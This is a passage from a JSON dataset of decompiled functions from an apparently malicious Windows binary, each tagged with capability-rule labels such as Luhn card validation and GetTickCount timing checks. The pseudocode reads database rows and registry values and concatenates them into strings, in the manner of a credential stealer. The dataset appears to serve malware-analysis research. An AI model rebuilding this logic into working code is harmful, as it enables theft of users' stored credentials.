        "decompiled_code": "\nvoid __cdecl fcn.0041a840(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_18h_00;\n    uint *arg_8h_00;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_135h;\n    uint *var_130h;\n    uint var_120h;\n    uint32_t var_11ch;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e6bb;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_13ch = arg_8h;\n    var_140h = arg_10h;\n    fcn.0042a6e0(&var_114h, 0, 0x104, var_10h);\n    (**0x463038)(&var_114h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    arg_8h_00 = &var_114h;\n    (**0x463038)(arg_8h_00, uVar1);\n    (**0x462ee0)(arg_ch, &var_114h, 1);\n    uVar1 = *0x451f54;\n    iVar2 = (**0x452598)(&var_114h, &var_144h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_144h, uVar1, 0xffffffff, &var_135h + 1, 0);\n        if (iVar2 == 0) {\n            iVar2 = (**0x452560)(stack0xfffffec8);\n            while (iVar2 == 100) {\n                uVar3 = (**0x452584)(unique0x100003ad, 0);\n                uVar4 = (**0x452584)(stack0xfffffec8, 1);\n                uVar1 = arg_14h;\n                arg_18h_00 = arg_18h;\n                arg_10h_00 = (**0x45256c)(stack0xfffffec8, 2);\n                arg_ch_00 = (**0x452574)(stack0xfffffec8, 2);\n                fcn.0041a6a0(&var_130h, arg_ch_00, arg_10h_00, uVar1, arg_18h_00);\n                var_4h = 0;\n                puVar5 = var_130h;\n                if (var_11ch < 0x10) {\n                    puVar5 = &var_130h;\n                }\n                iVar2 = (**0x463068)(puVar5, 0x4452bc);\n                if ((iVar2 != 0) || (iVar2 = (**0x463068)(uVar4, 0x4452bc),  iVar2 != 0)) {\n                    (**0x463038)(arg_1ch, 0x4452fc);\n                    (**0x463038)(arg_1ch, *0x451f94);\n                    (**0x463038)(arg_1ch, var_140h);\n                    (**0x463038)(arg_1ch, 0x446f2c);\n                    (**0x463038)(arg_1ch, var_13ch);\n                    (**0x463038)(arg_1ch, 0x446f28);\n                    (**0x463038)(arg_1ch, *0x45229c);\n                    (**0x463038)(arg_1ch, uVar3);\n                    (**0x463038)(arg_1ch, 0x4452fc);\n                    (**0x463038)(arg_1ch, *0x451d58);\n                    (**0x463038)(arg_1ch, uVar4);\n                    (**0x463038)(arg_1ch, 0x4452fc);\n                    (**0x463038)(arg_1ch, *0x452258);\n                    puVar5 = var_130h;\n                    if (var_11ch < 0x10) {\n                        puVar5 = &var_130h;\n                    }\n                    (**0x463038)(arg_1ch, puVar5);\n                    (**0x463038)(arg_1ch, 0x446f30);\n                }\n                var_4h = 0xffffffff;\n                if (0xf < var_11ch) {\n                    fcn.0042a679(var_130h);\n                }\n                var_11ch = 0xf;\n                var_120h = 0;\n                var_130h = var_130h & 0xffffff00;\n                iVar2 = (**0x452560)(stack0xfffffec8);\n            }\n        }\n        (**0x452564)(stack0xfffffec8);\n        (**0x45259c)(var_144h);\n    }\n    (**0x462f3c)(&var_114h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1263
    },
    "0041ab60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041ab60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint uVar9;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_23dh;\n    uint var_238h;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e6fb;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = (**0x463068)(arg_10h, *0x451ec8, var_10h);\n    if (iVar1 == 0) {\n        arg_ch = 0x4452bc;\n    }\n    else {\n        iVar1 = (**0x463068)(arg_10h, *0x451ef0);\n        if (iVar1 == 0) {\n            arg_ch = 0x4452bc;\n        }\n        else {\n            iVar1 = (**0x463068)(arg_ch, *0x4521cc);\n            if (iVar1 == 0) goto code_r0x0041b059;\n        }\n    }\n    fcn.0042a6e0(&var_218h, 0, 0x104);\n    (**0x463038)(&var_218h, *0x452154);\n    uVar2 = fcn.00420910(0x1a);\n    (**0x463038)(&var_218h, uVar2);\n    (**0x462ee0)(arg_8h, &var_218h, 1);\n    fcn.0042a6e0(&var_114h, 0, 0x104);\n    (**0x463038)(&var_114h, 0x445308);\n    (**0x463038)(&var_114h, *0x4521c0);\n    (**0x463038)(&var_114h, 0x445308);\n    (**0x463038)(&var_114h, arg_10h);\n    (**0x463038)(&var_114h, 0x44733c);\n    (**0x463038)(&var_114h, arg_ch);\n    (**0x463038)(&var_114h, 0x445300);\n    uVar2 = *0x451e50;\n    iVar1 = (**0x452598)(&var_218h, &var_244h);\n    if (iVar1 == 0) {\n        iVar1 = (**0x452544)(var_244h, uVar2, 0xffffffff, &var_23dh + 1, 0);\n        if (iVar1 == 0) {\n            uVar2 = (**0x463094)(0, 999999);\n            var_238h = (**0x46301c)(uVar2);\n            iVar1 = (**0x452560)(stack0xfffffdc0);\n            while (iVar1 == 100) {\n                uVar2 = (**0x452584)(unique0x10000593, 0);\n                uVar3 = (**0x452584)(stack0xfffffdc0, 1);\n                uVar4 = (**0x452584)(stack0xfffffdc0, 2);\n                uVar5 = (**0x452584)(stack0xfffffdc0, 3);\n                pcVar6 = (**0x452584)(stack0xfffffdc0, 4);\n                uVar7 = (**0x452584)(stack0xfffffdc0, 5);\n                iVar1 = (**0x463068)(uVar3, 0x447338);\n                if (iVar1 == 0) {\n                    fcn.0042a6e0(uVar3, 0, 4);\n                    uVar9 = *0x451ea8;\n                }\n                else {\n                    fcn.0042a6e0(uVar3, 0, 4);\n                    uVar9 = *0x4522c8;\n                }\n                (**0x463038)(uVar3, uVar9);\n                iVar1 = (**0x463068)(uVar5, 0x447338);\n                if (iVar1 == 0) {\n                    fcn.0042a6e0(uVar5, 0, 4);\n                    uVar9 = *0x451ea8;\n                }\n                else {\n                    fcn.0042a6e0(uVar5, 0, 4);\n                    uVar9 = *0x4522c8;\n                }\n                (**0x463038)(uVar5, uVar9);\n                if (*pcVar6 == '-') {\n                    fcn.0042a6e0(pcVar6, 0, 4);\n                    (**0x463038)(pcVar6, 0x447338);\n                }\n                (**0x463038)(var_238h, uVar2);\n                (**0x463038)(var_238h, 0x447324);\n                (**0x463038)(var_238h, uVar3);\n                (**0x463038)(var_238h, 0x447324);\n                (**0x463038)(var_238h, uVar4);\n                (**0x463038)(var_238h, 0x447324);\n                (**0x463038)(var_238h, uVar5);\n                (**0x463038)(var_238h, 0x447324);\n                (**0x463038)(var_238h, pcVar6);\n                (**0x463038)(var_238h, 0x447324);\n                (**0x463038)(var_238h, uVar7);\n                (**0x463038)(var_238h, 0x447324);\n                uVar2 = arg_14h;\n                uVar3 = arg_18h;\n                uVar4 = (**0x45256c)(stack0xfffffdc0, 6);\n                uVar5 = (**0x452574)(stack0xfffffdc0, 6);\n                puVar8 = fcn.0041a6a0(&var_234h, uVar5, uVar4, uVar2, uVar3);\n                var_4h = 0;\n                if (0xf < puVar8[5]) {\n                    puVar8 = *puVar8;\n                }\n                (**0x463038)(var_238h, puVar8);\n                var_4h = 0xffffffff;\n                if (0xf < var_220h) {\n                    fcn.0042a679(var_234h);\n                }\n                var_220h = 0xf;\n                var_224h = 0;\n                var_234h = var_234h & 0xffffff00;\n                (**0x463038)(var_238h, 0x4452fc);\n                iVar1 = (**0x452560)(stack0xfffffdc0);\n            }\n            uVar2 = (**0x462f30)(var_238h);\n            fcn.00429a10(arg_1ch, &var_114h, var_238h, uVar2);\n            fcn.0042a6e0(&var_238h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffdc0);\n        (**0x45259c)(var_244h);\n    }\n    (**0x462f3c)(&var_218h);\ncode_r0x0041b059:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1872
    },
    "0041b080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b080(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_ch_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_23dh;\n    uint var_238h;\n    uint32_t var_234h;\n    uint var_224h;\n    uint32_t var_220h;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e73b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042a6e0(&var_114h, 0, 0x104, var_10h);\n    (**0x463038)(&var_114h, *0x452154);\n    uVar1 = fcn.00420910(0x1a);\n    arg_8h_00 = &var_114h;\n    (**0x463038)(arg_8h_00, uVar1);\n    (**0x462ee0)(arg_8h, &var_114h, 1);\n    fcn.0042a6e0(&var_218h, 0, 0x104);\n    (**0x462e8c)(&var_218h, L\"\\x83\u00a3\u00c3\u00e3\u0102\", arg_10h, arg_ch);\n    uVar1 = *0x451cec;\n    iVar2 = (**0x452598)(&var_114h, &var_244h);\n    if (iVar2 == 0) {\n        iVar2 = (**0x452544)(var_244h, uVar1, 0xffffffff, &var_23dh + 1, 0);\n        if (iVar2 == 0) {\n            uVar1 = (**0x463094)(0, 999999);\n            var_238h = (**0x46301c)(uVar1);\n            iVar2 = (**0x452560)(stack0xfffffdc0);\n            while (iVar2 == 100) {\n                uVar1 = (**0x452584)(unique0x100003a1, 0);\n                uVar3 = (**0x452584)(stack0xfffffdc0, 1);\n                uVar4 = (**0x452584)(stack0xfffffdc0, 2);\n                (**0x463038)(var_238h, L\"cs\\x83\u00a3\u00c3\u00e3\u0102\");\n                (**0x463038)(var_238h, uVar1);\n                (**0x463038)(var_238h, 0x4452fc);\n                (**0x463038)(var_238h, L\"CScs\\x83\u00a3\u00c3\u00e3\u0102\");\n                (**0x463038)(var_238h, uVar3);\n                (**0x463038)(var_238h, 0x4452fc);\n                (**0x463038)(var_238h, L\"3;CScs\\x83\u00a3\u00c3\u00e3\u0102\");\n                (**0x463038)(var_238h, uVar4);\n                (**0x463038)(var_238h, 0x4452fc);\n                (**0x463038)(var_238h, L\"#+3;CScs\\x83\u00a3\u00c3\u00e3\u0102\");\n                uVar1 = arg_14h;\n                uVar3 = arg_18h;\n                uVar4 = (**0x45256c)(stack0xfffffdc0, 3);\n                arg_ch_00 = (**0x452574)(stack0xfffffdc0, 3);\n                puVar5 = fcn.0041a6a0(&var_234h, arg_ch_00, uVar4, uVar1, uVar3);\n                var_4h = 0;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                (**0x463038)(var_238h, puVar5);\n                var_4h = 0xffffffff;\n                if (0xf < var_220h) {\n                    fcn.0042a679(var_234h);\n                }\n                var_220h = 0xf;\n                var_224h = 0;\n                var_234h = var_234h & 0xffffff00;\n                (**0x463038)(var_238h, 0x446f30);\n                iVar2 = (**0x452560)(stack0xfffffdc0);\n            }\n            uVar1 = (**0x462f30)(var_238h);\n            fcn.00429a10(arg_1ch, &var_218h, var_238h, uVar1);\n            fcn.0042a6e0(&var_238h, 0, 4);\n        }\n        (**0x452564)(stack0xfffffdc0);\n        (**0x45259c)(var_244h);\n    }\n    (**0x462f3c)(&var_114h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1269
    },
    "0041b820": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b820(uchar *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *arg_10h_00;\n    uint uVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint32_t var_80h;\n    uint var_70h;\n    uint32_t var_6ch;\n    uint var_64h;\n    uint32_t var_50h;\n    uint32_t var_48h;\n    uint var_38h;\n    uint32_t var_34h;\n    uint32_t var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43e798;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_84h = 0;\n    var_88h = 0;\n    var_34h = 0xf;\n    var_38h = 0;\n    var_48h = var_48h & 0xffffff00;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    var_4h = 1;\n    iVar1 = fcn.0041a420(arg_14h, &var_84h, &var_88h);\n    uVar2 = (**0x463094)(8, var_88h);\n    iVar3 = (**0x46301c)(uVar2);\n    if (iVar3 == 0) {\n        if (var_84h != 0) {\n            uVar2 = (**0x463094)(0, var_84h);\n            (**0x4630c0)(uVar2);\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        fcn.0042ad20(0x4452bc);\n        fcn.004062a0(0x4452bc, 0x4452bc);\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n    }\n    else {\n        fcn.0042b111(iVar3, var_88h, var_84h);\n        if (var_84h != 0) {\n            uVar2 = (**0x463094)(0, var_84h);\n            (**0x4630c0)(uVar2);\n            var_84h = 0;\n        }\n        var_98h = iVar1;\n        if (iVar1 == 0xff) {\n            fcn.0041a420(iVar3, &var_84h, &var_88h);\n            uVar2 = (**0x463094)(0, iVar3);\n            (**0x4630c0)(uVar2);\n            uVar2 = (**0x463094)(8, var_88h);\n            iVar3 = (**0x46301c)(uVar2);\n            if (iVar3 != 0) {\n                fcn.0042b111(iVar3, var_88h, var_84h);\n                if (var_84h != 0) {\n                    uVar2 = (**0x463094)(0, var_84h);\n                    (**0x4630c0)(uVar2);\n                    var_84h = 0;\n                }\n                var_98h = fcn.0041a420(iVar3, &var_84h, &var_88h);\n                uVar2 = (**0x463094)(0, iVar3);\n                (**0x4630c0)(uVar2);\n                uVar2 = (**0x463094)(8, var_88h);\n                iVar3 = (**0x46301c)(uVar2);\n                if (iVar3 != 0) {\n                    fcn.0042b111(iVar3, var_88h, var_84h);\n                    if (var_84h != 0) {\n                        uVar2 = (**0x463094)(0, var_84h);\n                        (**0x4630c0)(uVar2);\n                        var_84h = 0;\n                    }\n                    goto code_r0x0041bb05;\n                }\n                if (var_84h != 0) {\ncode_r0x0041ba9e:\n                    uVar2 = (**0x463094)(0, var_84h);\n                    (**0x4630c0)(uVar2);\n                }\n                fcn.004063a0(0x4452bc);\n                fcn.00405d10();\n                fcn.00405d10();\n                goto code_r0x0041be81;\n            }\ncode_r0x0041b9ce:\n            if (var_84h != 0) {\n                uVar2 = (**0x463094)(0, var_84h);\n                (**0x4630c0)(uVar2);\n            }\n            *(arg_8h + 0x14) = 0xf;\n            *(arg_8h + 0x10) = 0;\n            *arg_8h = 0;\n            uVar2 = fcn.0042ad20(0x4452bc);\n            fcn.004062a0(0x4452bc, uVar2);\n        }\n        else {\ncode_r0x0041bb05:\n            iVar4 = fcn.0041a420(iVar3, &var_84h, &var_88h);\n            uVar2 = (**0x463094)(0, iVar3);\n            (**0x4630c0)(uVar2);\n            uVar2 = (**0x463094)(8, var_88h);\n            iVar3 = (**0x46301c)(uVar2);\n            if (iVar3 == 0) goto code_r0x0041b9ce;\n            fcn.0042b111(iVar3, var_88h, var_84h);\n            if (var_84h != 0) {\n                uVar2 = (**0x463094)(0, var_84h);\n                (**0x4630c0)(uVar2);\n            }\n            iVar5 = (**0x462f30)(iVar3);\n            iVar5 = iVar5 + iVar4 * -2 + 1;\n            uVar2 = (**0x463094)(8, iVar5);\n            var_84h = (**0x46301c)(uVar2);\n            if (var_84h == 0) {\n                fcn.004063a0(0x4452bc);\n            }\n            else {\n                var_88h = fcn.004063a0(iVar3);\n                var_4h = CONCAT31(var_4h._1_3_, 2);\n                uVar2 = (**0x462f30)(iVar3);\n                arg_10h_00 = fcn.0040e6b0(&var_80h, iVar4 * 2, uVar2);\n                if (0xf < arg_10h_00[5]) {\n                    arg_10h_00 = *arg_10h_00;\n                }\n                fcn.0042b111(var_84h, iVar5, arg_10h_00);\n                if (0xf < var_6ch) {\n                    fcn.0042a679(var_80h);\n                }\n                var_6ch = 0xf;\n                var_70h = 0;\n                var_80h = var_80h & 0xffffff00;\n                var_4h = CONCAT31(var_4h._1_3_, 1);\n                if (0xf < var_50h) {\n                    fcn.0042a679(var_64h);\n                }\n                uVar2 = (**0x463094)(0, iVar3);\n                (**0x4630c0)(uVar2);\n                var_88h = (**0x462f30)(var_84h);\n                var_88h = var_88h + 1;\n                uVar2 = (**0x463094)(8, var_88h);\n                iVar3 = (**0x46301c)(uVar2);\n                if (iVar3 == 0) goto code_r0x0041ba9e;\n                fcn.0042b111(iVar3, var_88h, var_84h);\n                uVar2 = (**0x463094)(0, var_84h);\n                (**0x4630c0)(uVar2);\n                var_84h = 0;\n                var_8ch = 0;\n                if (0 < var_98h) {\n                    do {\n                        uVar2 = fcn.0041a420(iVar3, &var_84h, &var_88h);\n                        uVar6 = (**0x463094)(0, iVar3);\n                        (**0x4630c0)(uVar6);\n                        uVar6 = (**0x463094)(8, var_88h);\n                        iVar3 = (**0x46301c)(uVar6);\n                        if (iVar3 == 0) {\n                            if (var_84h != 0) {\n                                uVar2 = (**0x463094)(0, var_84h);\n                                (**0x4630c0)(uVar2);\n                            }\n                            fcn.004063a0(0x4452bc);\n                            if (0xf < var_18h) {\n                                fcn.0042a679(var_2ch);\n                            }\n                            goto joined_r0x0041bee6;\n                        }\n                        fcn.0042b111(iVar3, var_88h, var_84h);\n                        if (var_84h != 0) {\n                            uVar6 = (**0x463094)(0, var_84h);\n                            (**0x4630c0)(uVar6);\n                            var_84h = 0;\n                        }\n                        fcn.0040bc50(1, uVar2);\n                        var_8ch = var_8ch + 1;\n                    } while (var_8ch < var_98h);\n                }\n                if (iVar1 == 0xff) {\n                    uVar2 = fcn.004063a0(arg_ch);\n                    var_4h._0_1_ = 3;\n                    fcn.004063e0(uVar2);\n                    var_4h._0_1_ = 1;\n                    if (0xf < var_50h) {\n                        fcn.0042a679(var_64h);\n                    }\n                    uVar2 = fcn.0042ad20(arg_10h);\n                    fcn.0040bb30(arg_10h, uVar2);\n                    uVar2 = fcn.0040e6b0(&var_64h, var_1ch, var_38h);\n                    var_4h._0_1_ = 4;\n                    fcn.004063e0(uVar2);\n                    var_4h = CONCAT31(var_4h._1_3_, 1);\n                    if (0xf < var_50h) {\n                        fcn.0042a679(var_64h);\n                    }\n                }\n                uVar2 = (**0x463094)(0, iVar3);\n                (**0x4630c0)(uVar2);\n                *(arg_8h + 0x14) = 0xf;\n                *(arg_8h + 0x10) = 0;\n                *arg_8h = 0;\n                fcn.004063e0(&var_48h);\n            }\n        }\n        if (0xf < var_18h) {\n            fcn.0042a679(var_2ch);\n        }\n    }\njoined_r0x0041bee6:\n    var_2ch = var_2ch & 0xffffff00;\n    var_1ch = 0;\n    var_18h = 0xf;\n    if (0xf < var_34h) {\n        var_18h = 0xf;\n        var_1ch = 0;\n        fcn.0042a679(var_48h);\n    }\ncode_r0x0041be81:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_14h);\n    return;\n}\n",
        "token_count": 2901
    },
    "0041bef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041bef0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_dech;\n    uint var_de8h;\n    uint var_de4h;\n    uint var_de0h;\n    uint var_ddch;\n    uint var_dd8h;\n    uint var_dd4h;\n    uint var_dd0h;\n    int32_t var_dcch;\n    uint var_dc8h;\n    char var_dc2h;\n    int32_t var_dc0h;\n    uint32_t var_dbch;\n    uint var_dach;\n    uint32_t var_da8h;\n    uint32_t var_da0h;\n    uint var_d90h;\n    uint32_t var_d8ch;\n    uint32_t var_d84h;\n    uint var_d74h;\n    uint32_t var_d70h;\n    uint32_t var_d68h;\n    uint var_d58h;\n    uint32_t var_d54h;\n    uint32_t var_d4ch;\n    uint var_d3ch;\n    uint32_t var_d38h;\n    uint *var_d30h;\n    uint var_d20h;\n    uint32_t var_d1ch;\n    uchar var_d14h;\n    uint var_d13h;\n    uchar var_914h;\n    uint var_913h;\n    uchar var_514h;\n    uint var_513h;\n    uchar var_114h;\n    uint var_113h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e80d;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_dcch = 0;\n    var_114h = 0;\n    fcn.0042a6e0(&var_113h, 0, 0x103, var_10h);\n    var_dc8h = 0x104;\n    var_d14h = 0;\n    fcn.0042a6e0(&var_d13h, 0, 0x3ff);\n    var_914h = 0;\n    fcn.0042a6e0(&var_913h, 0, 0x3ff);\n    var_514h = 0;\n    fcn.0042a6e0(&var_513h, 0, 0x3ff);\n    fcn.0042a6e0(&var_d14h, 0, 0x400);\n    fcn.0042a6e0(&var_914h, 0, 0x400);\n    fcn.0042a6e0(&var_514h, 0, 0x400);\n    arg_8h_00 = &var_dc0h;\n    var_de0h = 0x400;\n    var_dd8h = 0x400;\n    var_ddch = 0x400;\n    iVar1 = (**0x4630c4)(0x80000001, 0x4479d0, 0, 1);\n    uVar5 = *0x45217c;\n    if (iVar1 != 0) goto code_r0x0041c535;\n    var_d70h = 0xf;\n    var_d74h = 0;\n    var_d84h = var_d84h & 0xffffff00;\n    uVar2 = fcn.0042ad20(*0x45217c);\n    fcn.004062a0(uVar5, uVar2);\n    uVar5 = *0x452358;\n    var_4h = 0;\n    var_d38h = 0xf;\n    var_d3ch = 0;\n    var_d4ch = var_d4ch & 0xffffff00;\n    uVar2 = fcn.0042ad20(*0x452358);\n    fcn.004062a0(uVar5, uVar2);\n    var_4h._0_1_ = 1;\n    puVar3 = fcn.00423d50(&var_d68h, &var_d84h);\n    var_4h._0_1_ = 2;\n    puVar4 = fcn.00423d50(&var_da0h, &var_d4ch);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    if (7 < puVar3[5]) {\n        puVar3 = *puVar3;\n    }\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    iVar1 = (**0x462e80)(var_dc0h, puVar4, puVar3, 0x10, 0, &var_dd4h, &var_dech);\n    var_dc2h = iVar1 != 0;\n    if (7 < var_d8ch) {\n        fcn.0042a679(var_da0h);\n    }\n    var_d8ch = 7;\n    var_d90h = 0;\n    var_da0h = var_da0h & 0xffff0000;\n    if (7 < var_d54h) {\n        fcn.0042a679(var_d68h);\n    }\n    var_d54h = 7;\n    var_d58h = 0;\n    var_d68h = var_d68h & 0xffff0000;\n    if (0xf < var_d38h) {\n        fcn.0042a679(var_d4ch);\n    }\n    var_d38h = 0xf;\n    var_d3ch = 0;\n    var_d4ch = var_d4ch & 0xffffff00;\n    var_4h = 0xffffffff;\n    if (0xf < var_d70h) {\n        fcn.0042a679(var_d84h);\n    }\n    if (var_dc2h == '\\0') {\ncode_r0x0041c1c1:\n        if (var_dc0h != 0) {\n            (**0x462fe8)(var_dc0h);\n            var_dc0h = 0;\n        }\n    }\n    else if (var_dc0h != 0) {\n        (**0x462fe8)(var_dc0h);\n        var_dc0h = 0;\n        goto code_r0x0041c1c1;\n    }\n    iVar1 = (**0x4630c4)(0x80000001, 0x447978, 0, 9, &var_dc0h);\n    if (iVar1 == 0) {\n        iVar1 = (**0x46308c)(var_dc0h, 0, &var_114h, &var_dc8h, 0, 0, 0, 0);\n        if (iVar1 == 0) {\n            do {\n                (**0x463038)(arg_8h, 0x4452fc);\n                (**0x463038)(arg_8h, *0x451cf8);\n                (**0x463038)(arg_8h, 0x4452fc);\n                (**0x463038)(arg_8h, *0x45229c);\n                (**0x462f20)(var_dc0h, &var_114h, *0x451c58, 2, 0, &var_d14h, &var_de0h);\n                (**0x463038)(arg_8h, &var_d14h);\n                var_de8h = 4;\n                iVar1 = (**0x462f20)(var_dc0h, &var_114h, *0x451dbc, 0xffff, 0, &var_de4h, &var_de8h);\n                if (iVar1 == 0) {\n                    puVar3 = fcn.00423fe0(&var_d68h, var_de4h);\n                    var_4h = 4;\n                    if (0xf < puVar3[5]) {\n                        puVar3 = *puVar3;\n                    }\n                    (**0x463038)(arg_8h, puVar3);\n                    var_4h = 0xffffffff;\n                    if (0xf < var_d54h) {\n                        fcn.0042a679(var_d68h);\n                    }\n                }\n                else {\n                    (**0x463038)(arg_8h, 0x447970);\n                }\n                (**0x463038)(arg_8h, 0x4452fc);\n                (**0x463038)(arg_8h, *0x451d58);\n                (**0x462f20)(var_dc0h, &var_114h, *0x452320, 2, 0, &var_914h, &var_dd8h);\n                (**0x463038)(arg_8h, &var_914h);\n                var_d1ch = 0xf;\n                var_d20h = 0;\n                var_d30h = var_d30h & 0xffffff00;\n                var_4h = 5;\n                (**0x462f20)(var_dc0h, &var_114h, *0x451ee8, 2, 0, &var_514h, &var_ddch);\n                (**0x463038)(arg_8h, 0x4452fc);\n                (**0x463038)(arg_8h, *0x452258);\n                iVar1 = (**0x463068)(&var_514h, 0x4452bc);\n                if (iVar1 != 0) {\n                    uVar5 = fcn.0041b820(&var_dbch, &var_d14h, &var_914h, &var_514h);\n                    var_4h._0_1_ = 6;\n                    fcn.004063e0(uVar5);\n                    var_4h = CONCAT31(var_4h._1_3_, 5);\n                    if (0xf < var_da8h) {\n                        fcn.0042a679(var_dbch);\n                    }\n                    var_da8h = 0xf;\n                    var_dach = 0;\n                    var_dbch = var_dbch & 0xffffff00;\n                    puVar3 = var_d30h;\n                    if (var_d1ch < 0x10) {\n                        puVar3 = &var_d30h;\n                    }\n                    (**0x463038)(arg_8h, puVar3);\n                }\n                (**0x463038)(arg_8h, 0x446f30);\n                var_dcch = var_dcch + 1;\n                var_dc8h = 0x104;\n                iVar1 = (**0x46308c)(var_dc0h, var_dcch, &var_114h, &var_dc8h, 0, 0, 0, 0);\n                fcn.0042a6e0(&var_914h, 0, 0);\n                fcn.0042a6e0(&var_d30h, 0, 0);\n                fcn.0042a6e0(&var_514h, 0, 0);\n                var_4h = 0xffffffff;\n                if (0xf < var_d1ch) {\n                    fcn.0042a679(var_d30h);\n                }\n                var_d1ch = 0xf;\n                var_d20h = 0;\n                var_d30h = var_d30h & 0xffffff00;\n            } while (iVar1 != 0x103);\n        }\n        if (var_dc0h != 0) {\n            (**0x462fe8)(var_dc0h);\n        }\n    }\ncode_r0x0041c535:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_8h_00);\n    return;\n}\n",
        "token_count": 2686
    },
    "0041c560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
